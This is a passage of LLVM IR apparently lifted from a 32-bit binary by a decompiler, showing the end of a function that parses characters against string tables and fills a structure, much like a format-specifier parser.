  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_805fcb8.714 to i32), i32* @edx, align 4
  %v4_8050ef3.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050ef3

dec_label_pc_8050ef3:                             ; preds = %dec_label_pc_8050efd, %dec_label_pc_8050eee
  %v0_8050efd = phi i32 [ %v1_8050efd, %dec_label_pc_8050efd ], [ ptrtoint ([9 x i8]* @global_var_805fcb8.714 to i32), %dec_label_pc_8050eee ]
  %v4_8050ef3 = phi i32 [ %v6_8050ef3, %dec_label_pc_8050efd ], [ %v4_8050ef3.pre, %dec_label_pc_8050eee ]
  %v2_8050ef3 = load i8, i8* %.pre, align 1
  %v3_8050ef3 = zext i8 %v2_8050ef3 to i32
  %v5_8050ef3 = and i32 %v4_8050ef3, -256
  %v6_8050ef3 = or i32 %v3_8050ef3, %v5_8050ef3
  store i32 %v6_8050ef3, i32* %eax.global-to-local, align 4
  %v3_8050ef5 = inttoptr i32 %v0_8050efd to i8*
  %v4_8050ef5 = load i8, i8* %v3_8050ef5, align 1
  %v15_8050ef5 = icmp eq i8 %v2_8050ef3, %v4_8050ef5
  br i1 %v15_8050ef5, label %dec_label_pc_8050d65, label %dec_label_pc_8050efd

dec_label_pc_8050efd:                             ; preds = %dec_label_pc_8050ef3
  %v1_8050efd = add i32 %v0_8050efd, 1
  store i32 %v1_8050efd, i32* @edx, align 4
  %v1_8050efe = inttoptr i32 %v1_8050efd to i8*
  %v2_8050efe = load i8, i8* %v1_8050efe, align 1
  %v3_8050efe = icmp eq i8 %v2_8050efe, 0
  %v1_8050f01 = icmp eq i1 %v3_8050efe, false
  br i1 %v1_8050f01, label %dec_label_pc_8050ef3, label %dec_label_pc_8050f03

dec_label_pc_8050f03:                             ; preds = %dec_label_pc_8050efd, %dec_label_pc_8050d65
  %v0_8050f16 = phi i32 [ %v1_8050d65, %dec_label_pc_8050d65 ], [ %v0_8050ef3.pre.pre, %dec_label_pc_8050efd ]
  %v0_8050f13 = phi i32 [ %v0_8050efd, %dec_label_pc_8050d65 ], [ %v1_8050efd, %dec_label_pc_8050efd ]
  %v1_8050f05 = add i32 %v0_8050f13, -134610104
  %v1_8050f0a = add i32 %v0_8050f13, -134610105
  %v5_8050f0a = sub i32 134610104, %v0_8050f13
  %v6_8050f0a = and i32 %v1_8050f05, %v5_8050f0a
  %v7_8050f0a = icmp slt i32 %v6_8050f0a, 0
  %v8_8050f0a = icmp eq i32 %v1_8050f0a, 0
  %v9_8050f0a = icmp slt i32 %v1_8050f0a, 0
  store i32 %v1_8050f0a, i32* %eax.global-to-local, align 4
  %v3_8050f0b = icmp eq i1 %v9_8050f0a, %v7_8050f0a
  %v4_8050f0b = icmp eq i1 %v8_8050f0a, false
  %v5_8050f0b = and i1 %v4_8050f0b, %v3_8050f0b
  br i1 %v5_8050f0b, label %dec_label_pc_8050f17, label %dec_label_pc_8050f0d

dec_label_pc_8050f0d:                             ; preds = %dec_label_pc_8050f03
  %v1_8050f0d = inttoptr i32 %v0_8050f16 to i8*
  %v2_8050f0d = load i8, i8* %v1_8050f0d, align 1
  %v3_8050f0d = zext i8 %v2_8050f0d to i32
  %v5_8050f0d = and i32 %v1_8050f0a, -256
  %v6_8050f0d = or i32 %v3_8050f0d, %v5_8050f0d
  store i32 %v6_8050f0d, i32* %eax.global-to-local, align 4
  %v3_8050f0f = inttoptr i32 %v0_8050f13 to i8*
  %v4_8050f0f = load i8, i8* %v3_8050f0f, align 1
  %v15_8050f0f = icmp eq i8 %v2_8050f0d, %v4_8050f0f
  %v1_8050f11 = icmp eq i1 %v15_8050f0f, false
  br i1 %v1_8050f11, label %dec_label_pc_8050f17, label %dec_label_pc_8050f13

dec_label_pc_8050f13:                             ; preds = %dec_label_pc_8050f0d
  %v1_8050f13 = add i32 %v0_8050f13, 9
  store i32 %v1_8050f13, i32* @edx, align 4
  %v1_8050f16 = add i32 %v0_8050f16, 1
  store i32 %v1_8050f16, i32* @esi, align 4
  br label %dec_label_pc_8050f17

dec_label_pc_8050f17:                             ; preds = %dec_label_pc_8050f0d, %dec_label_pc_8050f03, %dec_label_pc_8050f13
  %v4_8050f1e = phi i32 [ %v6_8050f0d, %dec_label_pc_8050f0d ], [ %v1_8050f0a, %dec_label_pc_8050f03 ], [ %v6_8050f0d, %dec_label_pc_8050f13 ]
  %v0_8050f1e = phi i32 [ %v0_8050f16, %dec_label_pc_8050f0d ], [ %v0_8050f16, %dec_label_pc_8050f03 ], [ %v1_8050f16, %dec_label_pc_8050f13 ]
  %v0_8050f17 = phi i32 [ %v0_8050f13, %dec_label_pc_8050f0d ], [ %v0_8050f13, %dec_label_pc_8050f03 ], [ %v1_8050f13, %dec_label_pc_8050f13 ]
  %v1_8050f17 = add i32 %v0_8050f17, 9
  %v2_8050f17 = inttoptr i32 %v1_8050f17 to i8*
  %v3_8050f17 = load i8, i8* %v2_8050f17, align 1
  %v4_8050f17 = sext i8 %v3_8050f17 to i32
  %v2_8050f1b = mul nsw i32 %v4_8050f17, 256
  store i32 %v2_8050f1b, i32* %ebx.global-to-local, align 4
  %v1_8050f1e = inttoptr i32 %v0_8050f1e to i8*
  %v2_8050f1e = load i8, i8* %v1_8050f1e, align 1
  %v3_8050f1e = zext i8 %v2_8050f1e to i32
  %v5_8050f1e = and i32 %v4_8050f1e, -256
  %v6_8050f1e = or i32 %v3_8050f1e, %v5_8050f1e
  store i32 %v6_8050f1e, i32* %eax.global-to-local, align 4
  %v4_8050f20 = icmp eq i8 %v2_8050f1e, 0
  br i1 %v4_8050f20, label %dec_label_pc_80510d4, label %dec_label_pc_8050f28

dec_label_pc_8050f28:                             ; preds = %dec_label_pc_8050f17
  store i32 ptrtoint ([21 x i8]* @global_var_805fcf5.715 to i32), i32* %ecx.global-to-local, align 4
  %v3_8050f2d = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8050f2d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050f31

dec_label_pc_8050f31:                             ; preds = %dec_label_pc_8050f80, %dec_label_pc_8050f28
  %v0_8050f80 = phi i32 [ %v1_8050f80, %dec_label_pc_8050f80 ], [ ptrtoint ([21 x i8]* @global_var_805fcf5.715 to i32), %dec_label_pc_8050f28 ]
  %v3_8050f31 = inttoptr i32 %v0_8050f80 to i8*
  %v4_8050f31 = load i8, i8* %v3_8050f31, align 1
  %v15_8050f31 = icmp eq i8 %v2_8050f1e, %v4_8050f31
  %v1_8050f33 = icmp eq i1 %v15_8050f31, false
  br i1 %v1_8050f33, label %dec_label_pc_8050f80, label %dec_label_pc_8050f35

dec_label_pc_8050f35:                             ; preds = %dec_label_pc_8050f31
  %v1_8050f37 = add i32 %v0_8050f80, -134610165
  store i32 %v1_8050f37, i32* %edx.global-to-local, align 4
  %v7_8050f40 = icmp sgt i32 %v1_8050f37, 17
  br i1 %v7_8050f40, label %dec_label_pc_8050f42, label %dec_label_pc_8050f4a

dec_label_pc_8050f42:                             ; preds = %dec_label_pc_8050f35
  %v3_8050f42 = and i32 %v2_8050f1b, 1024
  %v4_8050f42 = icmp eq i32 %v3_8050f42, 0
  br i1 %v4_8050f42, label %dec_label_pc_8050f4a, label %dec_label_pc_8050f47

dec_label_pc_8050f47:                             ; preds = %dec_label_pc_8050f42
  %v1_8050f47 = add i32 %v0_8050f80, -134610167
  store i32 %v1_8050f47, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050f4a

dec_label_pc_8050f4a:                             ; preds = %dec_label_pc_8050f35, %dec_label_pc_8050f42, %dec_label_pc_8050f47
  %v0_8050f53 = phi i32 [ %v1_8050f37, %dec_label_pc_8050f35 ], [ %v1_8050f37, %dec_label_pc_8050f42 ], [ %v1_8050f47, %dec_label_pc_8050f47 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805fceb.716 to i32), i32* %ecx.global-to-local, align 4
  %v2_8050f53 = add i32 %tmp76, 32
  %v3_8050f53 = inttoptr i32 %v2_8050f53 to i32*
  store i32 %v0_8050f53, i32* %v3_8050f53, align 4
  %v0_8050f56.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_8050f5a.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050f56

dec_label_pc_8050f56:                             ; preds = %dec_label_pc_8050f56, %dec_label_pc_8050f4a
  %v0_8050f56 = phi i32 [ %v1_8050f56, %dec_label_pc_8050f56 ], [ %v0_8050f56.pre, %dec_label_pc_8050f4a ]
  %v1_8050f56 = add i32 %v0_8050f56, 1
  store i32 %v1_8050f56, i32* %ecx.global-to-local, align 4
  %v1_8050f57 = inttoptr i32 %v1_8050f56 to i8*
  %v2_8050f57 = load i8, i8* %v1_8050f57, align 1
  %v3_8050f57 = sext i8 %v2_8050f57 to i32
  store i32 %v3_8050f57, i32* %eax.global-to-local, align 4
  %v8_8050f5c = icmp sgt i32 %v0_8050f5a.pre, %v3_8050f57
  br i1 %v8_8050f5c, label %dec_label_pc_8050f56, label %dec_label_pc_8050f5e

dec_label_pc_8050f5e:                             ; preds = %dec_label_pc_8050f56
  store i32 ptrtoint ([21 x i8]* @global_var_805fcf5.715 to i32), i32* @ecx, align 4
  %v1_8050f65 = add i32 %v0_8050f56, -134610155
  store i32 %v1_8050f65, i32* %eax.global-to-local, align 4
  %v2_8050f6a = add i32 %v0_8050f56, add (i32 ptrtoint (i32* @global_var_805fcdc.717 to i32), i32 -134610155)
  %v3_8050f6a = add i32 %v2_8050f6a, %v1_8050f65
  %v4_8050f6a = inttoptr i32 %v3_8050f6a to i16*
  %v5_8050f6a = load i16, i16* %v4_8050f6a, align 2
  %v6_8050f6a = sext i16 %v5_8050f6a to i32
  store i32 %v6_8050f6a, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_8050f65, 2
  %v3_8050f72 = add i32 %factor, 134610124
  %v4_8050f72 = inttoptr i32 %v3_8050f72 to i16*
  %v5_8050f72 = load i16, i16* %v4_8050f72, align 2
  %v6_8050f72 = sext i16 %v5_8050f72 to i32
  store i32 %v6_8050f72, i32* %eax.global-to-local, align 4
  %v1_8050f7a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050f7a = or i32 %v1_8050f7a, %v6_8050f6a
  %v2_8050f7c = and i32 %v2_8050f7a, %v6_8050f72
  store i32 %v2_8050f7c, i32* %edx.global-to-local, align 4
  %v0_8050f8e.pre = load i32, i32* @esi, align 4
  %v0_8050f91.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050f86

dec_label_pc_8050f80:                             ; preds = %dec_label_pc_8050f31
  %v1_8050f80 = add i32 %v0_8050f80, 1
  store i32 %v1_8050f80, i32* @ecx, align 4
  %v1_8050f81 = inttoptr i32 %v1_8050f80 to i8*
  %v2_8050f81 = load i8, i8* %v1_8050f81, align 1
  %v3_8050f81 = icmp eq i8 %v2_8050f81, 0
  %v1_8050f84 = icmp eq i1 %v3_8050f81, false
  br i1 %v1_8050f84, label %dec_label_pc_8050f31, label %dec_label_pc_8050f86

dec_label_pc_8050f86:                             ; preds = %dec_label_pc_8050f80, %dec_label_pc_8050f5e
  %v0_8050f91 = phi i32 [ %v0_8050f91.pre, %dec_label_pc_8050f5e ], [ %storemerge4, %dec_label_pc_8050f80 ]
  %v0_8050f8e = phi i32 [ %v0_8050f8e.pre, %dec_label_pc_8050f5e ], [ %v0_8050f1e, %dec_label_pc_8050f80 ]
  %v0_8050f86 = phi i32 [ %v2_8050f7c, %dec_label_pc_8050f5e ], [ %v3_8050f2d, %dec_label_pc_8050f80 ]
  store i32 %v0_8050f86, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_8050f8e = inttoptr i32 %v0_8050f8e to i8*
  %v2_8050f8e = load i8, i8* %v1_8050f8e, align 1
  %v3_8050f8e = sext i8 %v2_8050f8e to i32
  store i32 %v3_8050f8e, i32* %eax.global-to-local, align 4
  %v2_8050f91 = add i32 %tmp76, 4
  %v3_8050f91 = inttoptr i32 %v2_8050f91 to i32*
  store i32 %v0_8050f91, i32* %v3_8050f91, align 4
  %v0_8050f94 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f94 = load i32, i32* @edx, align 4
  %v2_8050f94 = add i32 %v1_8050f94, 12
  %v3_8050f94 = inttoptr i32 %v2_8050f94 to i32*
  store i32 %v0_8050f94, i32* %v3_8050f94, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_8050f9b = load i32, i32* @edx, align 4
  %v1_8050f9b = add i32 %v0_8050f9b, 28
  %v2_8050f9b = inttoptr i32 %v1_8050f9b to i32*
  store i32 1, i32* %v2_8050f9b, align 4
  %v0_8050fa2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050fa2 = load i32, i32* @edx, align 4
  %v2_8050fa2 = add i32 %v1_8050fa2, 8
  %v3_8050fa2 = inttoptr i32 %v2_8050fa2 to i32*
  store i32 %v0_8050fa2, i32* %v3_8050fa2, align 4
  %v0_8050fa5 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050faf = and i32 %v0_8050fa5, -5
  %v0_8050fb5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050fb5 = and i32 %v0_8050fb5, 3840
  store i32 %v1_8050fb5, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_8050fbe = or i32 %v1_8050fb5, %v1_8050faf
  store i32 %v2_8050fbe, i32* @edi, align 4
  %v1_8050fc0 = load i32, i32* @edx, align 4
  %v2_8050fc0 = add i32 %v1_8050fc0, 20
  %v3_8050fc0 = inttoptr i32 %v2_8050fc0 to i32*
  store i32 48, i32* %v3_8050fc0, align 4
  %v0_8050fc3 = load i32, i32* @edi, align 4
  %v1_8050fc3 = load i32, i32* @edx, align 4
  %v2_8050fc3 = add i32 %v1_8050fc3, 16
  %v3_8050fc3 = inttoptr i32 %v2_8050fc3 to i32*
  store i32 %v0_8050fc3, i32* %v3_8050fc3, align 4
  %v0_8050fc6 = load i32, i32* @ecx, align 4
  %v1_8050fc6 = inttoptr i32 %v0_8050fc6 to i8*
  %v2_8050fc6 = load i8, i8* %v1_8050fc6, align 1
  %v3_8050fc6 = icmp eq i8 %v2_8050fc6, 0
  %v1_8050fc9 = icmp eq i1 %v3_8050fc6, false
  br i1 %v1_8050fc9, label %dec_label_pc_8050fe2, label %dec_label_pc_8050fcb

dec_label_pc_8050fcb:                             ; preds = %dec_label_pc_8050f86
  %v0_8050fcb = load i32, i32* @esi, align 4
  %v1_8050fcb = inttoptr i32 %v0_8050fcb to i8*
  %v2_8050fcb = load i8, i8* %v1_8050fcb, align 1
  %v11_8050fcb = icmp eq i8 %v2_8050fcb, 109
  %v1_8050fce = icmp eq i1 %v11_8050fcb, false
  br i1 %v1_8050fce, label %dec_label_pc_80510d4, label %dec_label_pc_8050fd4

dec_label_pc_8050fd4:                             ; preds = %dec_label_pc_8050fcb
  %v0_8050fd4 = load i32, i32* @edx, align 4
  %v1_8050fd4 = add i32 %v0_8050fd4, 32
  %v2_8050fd4 = inttoptr i32 %v1_8050fd4 to i32*
  store i32 20, i32* %v2_8050fd4, align 4
  %v0_8050fdb = load i32, i32* @edx, align 4
  %v1_8050fdb = add i32 %v0_8050fdb, 28
  %v2_8050fdb = inttoptr i32 %v1_8050fdb to i32*
  store i32 0, i32* %v2_8050fdb, align 4
  br label %dec_label_pc_8050fe2

dec_label_pc_8050fe2:                             ; preds = %dec_label_pc_8050f86, %dec_label_pc_8050fd4
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_8051076, label %dec_label_pc_8050fed

dec_label_pc_8050fed:                             ; preds = %dec_label_pc_8050fe2
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_805102e = add i32 %tmp76, 40
  %v1_8051067 = add i32 %tmp76, 28
  %v2_8051067 = inttoptr i32 %v1_8051067 to i32*
  %v4_8050ffc = add i32 %tmp76, 36
  br label %dec_label_pc_8050fef

dec_label_pc_8050fef:                             ; preds = %dec_label_pc_8051062, %dec_label_pc_8050fed
  %v0_8051005 = phi i32 [ 0, %dec_label_pc_8050fed ], [ %v1_8051066, %dec_label_pc_8051062 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_8050fed ], [ %stack_var_-88.5, %dec_label_pc_8051062 ]
  %v1_8050fef = add i32 %v0_8051005, -2
  %v6_8050fef = sub i32 1, %v0_8051005
  %v7_8050fef = and i32 %v6_8050fef, %v0_8051005
  %v8_8050fef = icmp slt i32 %v7_8050fef, 0
  %v9_8050fef = icmp eq i32 %v1_8050fef, 0
  %v10_8050fef = icmp slt i32 %v1_8050fef, 0
  %v3_8050ff2 = icmp eq i1 %v10_8050fef, %v8_8050fef
  %v4_8050ff2 = icmp eq i1 %v9_8050fef, false
  %v5_8050ff2 = and i1 %v4_8050ff2, %v3_8050ff2
  br i1 %v5_8050ff2, label %dec_label_pc_8051005, label %dec_label_pc_8050ff4

dec_label_pc_8050ff4:                             ; preds = %dec_label_pc_8050fef
  store i32 %tmp76, i32* @edx, align 4
  %v0_8050ff8 = load i32, i32* @esp, align 4
  %v2_8050ff8 = mul i32 %v0_8051005, 4
  %v3_8050ff8 = add i32 %v2_8050ff8, 68
  %v4_8050ff8 = add i32 %v3_8050ff8, %v0_8050ff8
  %v5_8050ff8 = inttoptr i32 %v4_8050ff8 to i32*
  %v6_8050ff8 = load i32, i32* %v5_8050ff8, align 4
  store i32 %v6_8050ff8, i32* %eax.global-to-local, align 4
  %v1_8050ffc = trunc i32 %v6_8050ff8 to i8
  %v5_8050ffc = add i32 %v4_8050ffc, %v0_8051005
  %v6_8050ffc = inttoptr i32 %v5_8050ffc to i8*
  store i8 %v1_8050ffc, i8* %v6_8050ffc, align 1
  %v0_8051000 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051000 = urem i32 %v0_8051000, 256
  br label %dec_label_pc_805100e

dec_label_pc_8051005:                             ; preds = %dec_label_pc_8050fef
  %v5_8051007 = add i32 %v0_8051005, %stack_var_-32.3
  store i32 %v5_8051007, i32* %eax.global-to-local, align 4
  %v1_805100b = add i32 %v5_8051007, -2
  br label %dec_label_pc_805100e

dec_label_pc_805100e:                             ; preds = %dec_label_pc_8050ff4, %dec_label_pc_8051005
  %v0_8051021 = phi i32 [ %v1_8051000, %dec_label_pc_8050ff4 ], [ %v1_805100b, %dec_label_pc_8051005 ]
  store i32 %v0_8051021, i32* %eax.global-to-local, align 4
  %v5_805100e = sub i32 %v0_8051021, %stack_var_-88.4
  %v11_805100e = xor i32 %v0_8051021, %stack_var_-88.4
  %v12_805100e = xor i32 %v5_805100e, %v0_8051021
  %v13_805100e = and i32 %v12_805100e, %v11_805100e
  %v14_805100e = icmp slt i32 %v13_805100e, 0
  %v15_805100e = icmp eq i32 %v5_805100e, 0
  %v16_805100e = icmp slt i32 %v5_805100e, 0
  %v3_8051012 = icmp ne i1 %v16_805100e, %v14_805100e
  %v4_8051012 = or i1 %v15_805100e, %v3_8051012
  br i1 %v4_8051012, label %dec_label_pc_8051021, label %dec_label_pc_8051014

dec_label_pc_8051014:                             ; preds = %dec_label_pc_805100e
  %v1_8051014 = add i32 %v0_8051021, -9
  %v6_8051014 = sub i32 8, %v0_8051021
  %v7_8051014 = and i32 %v6_8051014, %v0_8051021
  %v8_8051014 = icmp slt i32 %v7_8051014, 0
  %v9_8051014 = icmp eq i32 %v1_8051014, 0
  %v10_8051014 = icmp slt i32 %v1_8051014, 0
  %v3_8051017 = icmp eq i1 %v10_8051014, %v8_8051014
  %v4_8051017 = icmp eq i1 %v9_8051014, false
  %v5_8051017 = and i1 %v4_8051017, %v3_8051017
  br i1 %v5_8051017, label %dec_label_pc_80510d4, label %dec_label_pc_8051021

dec_label_pc_8051021:                             ; preds = %dec_label_pc_8051014, %dec_label_pc_805100e
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_805100e ], [ %v0_8051021, %dec_label_pc_8051014 ]
  %v1_8051021 = add i32 %v0_8051021, -1
  store i32 %v1_8051021, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_805102a = load i32, i32* @esp, align 4
  %v1_805102a = load i32, i32* %ebp.global-to-local, align 4
  %v2_805102a = mul i32 %v1_805102a, 4
  %v3_805102a = add i32 %v0_805102a, 80
  %v4_805102a = add i32 %v3_805102a, %v2_805102a
  %v5_805102a = inttoptr i32 %v4_805102a to i32*
  %v6_805102a = load i32, i32* %v5_805102a, align 4
  store i32 %v6_805102a, i32* %edi.global-to-local, align 4
  %v2_805102e = mul i32 %v1_8051021, 4
  %v4_805102e = add i32 %v3_805102e, %v2_805102e
  %v5_805102e = inttoptr i32 %v4_805102e to i32*
  %v6_805102e = load i32, i32* %v5_805102e, align 4
  store i32 %v6_805102e, i32* @eax, align 4
  %v9_8051032 = icmp eq i32 %v6_805102a, 8
  br i1 %v9_8051032, label %dec_label_pc_8051062, label %dec_label_pc_8051037

dec_label_pc_8051037:                             ; preds = %dec_label_pc_8051021
  %v9_8051037 = icmp eq i32 %v6_805102e, 8
  br i1 %v9_8051037, label %dec_label_pc_8051052, label %dec_label_pc_805103c

dec_label_pc_805103c:                             ; preds = %dec_label_pc_8051037
  %v12_805103c = icmp eq i32 %v6_805102e, %v6_805102a
  br i1 %v12_805103c, label %dec_label_pc_8051052, label %dec_label_pc_8051040

dec_label_pc_8051040:                             ; preds = %dec_label_pc_805103c
  %v1_8051040 = call i32 @_promoted_size(i32 %v1_8051021)
  store i32 %v1_8051040, i32* %ebx.global-to-local, align 4
  %v0_8051047 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_8051047, i32* @eax, align 4
  %v1_8051049 = call i32 @_promoted_size(i32 %v1_8051021)
  store i32 %v1_8051049, i32* %eax.global-to-local, align 4
  %v8_8051050 = icmp sgt i32 %v1_8051040, %v1_8051049
  br i1 %v8_8051050, label %dec_label_pc_8051062, label %dec_label_pc_8051040.dec_label_pc_8051052_crit_edge

dec_label_pc_8051040.dec_label_pc_8051052_crit_edge: ; preds = %dec_label_pc_8051040
  %v0_805105a.pre = load i32, i32* @esp, align 4
  %v1_805105a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8051052

dec_label_pc_8051052:                             ; preds = %dec_label_pc_8051040.dec_label_pc_8051052_crit_edge, %dec_label_pc_805103c, %dec_label_pc_8051037
  %v1_805105a = phi i32 [ %v1_805105a.pre, %dec_label_pc_8051040.dec_label_pc_8051052_crit_edge ], [ %v1_805102a, %dec_label_pc_805103c ], [ %v1_805102a, %dec_label_pc_8051037 ]
  %v0_805105a = phi i32 [ %v0_805105a.pre, %dec_label_pc_8051040.dec_label_pc_8051052_crit_edge ], [ %v0_805102a, %dec_label_pc_805103c ], [ %v0_805102a, %dec_label_pc_8051037 ]
  store i32 %v1_8051021, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_805105a = mul i32 %v1_805105a, 4
  %v3_805105a = add i32 %v0_805105a, 80
  %v4_805105a = add i32 %v3_805105a, %v2_805105a
  %v5_805105a = inttoptr i32 %v4_805105a to i32*
  %v6_805105a = load i32, i32* %v5_805105a, align 4
  store i32 %v6_805105a, i32* %eax.global-to-local, align 4
  store i32 %v6_805105a, i32* %v5_805102e, align 4
  br label %dec_label_pc_8051062

dec_label_pc_8051062:                             ; preds = %dec_label_pc_8051040, %dec_label_pc_8051021, %dec_label_pc_8051052
  store i32 %tmp76, i32* @ecx, align 4
  %v0_8051066 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051066 = add i32 %v0_8051066, 1
  store i32 %v1_8051066, i32* %ebp.global-to-local, align 4
  %v3_8051067 = load i32, i32* %v2_8051067, align 4
  %v1_805106a = add i32 %v3_8051067, 2
  store i32 %v1_805106a, i32* %eax.global-to-local, align 4
  %v5_805106f = icmp slt i32 %v1_8051066, %v1_805106a
  br i1 %v5_805106f, label %dec_label_pc_8050fef, label %dec_label_pc_805109d

dec_label_pc_8051076:                             ; preds = %dec_label_pc_8050fe2
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_805107a = add i32 %tmp76, 38
  %v2_805107a = inttoptr i32 %v1_805107a to i8*
  store i8 1, i8* %v2_805107a, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8051083 = add i32 %tmp76, 28
  %v2_8051083 = inttoptr i32 %v1_8051083 to i32*
  %v3_8051083 = load i32, i32* %v2_8051083, align 4
  %v2_8051086 = mul i32 %v3_8051083, 4
  %v2_805108a = ptrtoint i32* %stack_var_-20 to i32
  %v1_8051091 = add i32 %tmp76, 40
  store i32 %v1_8051091, i32* %eax.global-to-local, align 4
  %v3_8051095 = inttoptr i32 %v1_8051091 to i16*
  %v4_8051095 = call i32 @memcpy(i16* %v3_8051095, i32 %v2_805108a, i32 %v2_8051086)
  store i32 %v4_8051095, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805109d

dec_label_pc_805109d:                             ; preds = %dec_label_pc_8051062, %dec_label_pc_8051076
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_8051076 ], [ %stack_var_-88.5, %dec_label_pc_8051062 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_8050d48, align 4
  %v0_80510a8 = load i32, i32* @ecx, align 4
  %v1_80510a8 = add i32 %v0_80510a8, 16
  %v2_80510a8 = inttoptr i32 %v1_80510a8 to i8*
  %v3_80510a8 = load i8, i8* %v2_80510a8, align 1
  %v5_80510a8 = icmp slt i8 %v3_80510a8, 0
  br i1 %v5_80510a8, label %dec_label_pc_80510b5, label %dec_label_pc_80510ae

dec_label_pc_80510ae:                             ; preds = %dec_label_pc_805109d
  %v0_80510ae = load i32, i32* @esi, align 4
  %v1_80510ae = add i32 %v0_80510ae, 1
  store i32 %v1_80510ae, i32* %eax.global-to-local, align 4
  %v2_80510b1 = inttoptr i32 %v0_80510a8 to i32*
  store i32 %v1_80510ae, i32* %v2_80510b1, align 4
  br label %dec_label_pc_80510c8

dec_label_pc_80510b5:                             ; preds = %dec_label_pc_805109d
  store i32 %v4_8050d1c, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_80510bd = load i32, i32* @esi, align 4
  %v2_80510bd = sub i32 %v0_80510bd, %v4_8050d1c
  store i32 %v2_80510bd, i32* %esi.global-to-local, align 4
  %v1_80510bf = mul i32 %v2_80510bd, 4
  %v2_80510bf = add i32 %v1_80510bf, 224
  store i32 %v2_80510bf, i32* %eax.global-to-local, align 4
  %v2_80510c6 = load i32, i32* %arg1, align 4
  %v4_80510c6 = add i32 %v2_80510c6, %v2_80510bf
  store i32 %v4_80510c6, i32* %arg1, align 4
  br label %dec_label_pc_80510c8

dec_label_pc_80510c8:                             ; preds = %dec_label_pc_80510ae, %dec_label_pc_80510b5
  store i32 %tmp76, i32* @edx, align 4
  %v1_80510cc = add i32 %tmp76, 28
  %v2_80510cc = inttoptr i32 %v1_80510cc to i32*
  %v3_80510cc = load i32, i32* %v2_80510cc, align 4
  store i32 %v3_80510cc, i32* %eax.global-to-local, align 4
  %v1_80510cf = add i32 %v3_80510cc, 2
  br label %dec_label_pc_80510d7

dec_label_pc_80510d4:                             ; preds = %dec_label_pc_8050d6d, %dec_label_pc_8050e07, %dec_label_pc_8050e3a, %dec_label_pc_8050eb5, %dec_label_pc_8050ea1, %dec_label_pc_8050e98, %dec_label_pc_8051014, %dec_label_pc_8050fcb, %dec_label_pc_8050f17
  br label %dec_label_pc_80510d7

dec_label_pc_80510d7:                             ; preds = %dec_label_pc_80510c8, %dec_label_pc_80510d4
  %storemerge6 = phi i32 [ %v1_80510cf, %dec_label_pc_80510c8 ], [ -1, %dec_label_pc_80510d4 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_80510da = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80510da, i32* @ebx, align 4
  store i32 %v0_8050d1b, i32* @esi, align 4
  store i32 %v0_8050d1a, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_8051066, { 0, 2, 1 }
  uselistorder i32 %v1_8051021, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8051014, { 1, 0 }
  uselistorder i32 %v5_805100e, { 1, 2, 0 }
  uselistorder i32 %v0_8051021, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_8050fef, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_8051005, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_8050f80, { 1, 2, 0 }
  uselistorder i32 %v1_8050f56, { 1, 2, 0 }
  uselistorder i32 %v0_8050f80, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8050f1b, { 1, 0 }
  uselistorder i32 %v1_8050f0a, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_8050f13, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_8050efd, { 0, 2, 3, 1 }
  uselistorder i32 %v6_8050ef3, { 1, 0 }
  uselistorder i32 %v1_8050ed5, { 1, 0 }
  uselistorder i32 %v0_8050ef3.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_8050eb8, { 1, 0, 2, 3, 4 }
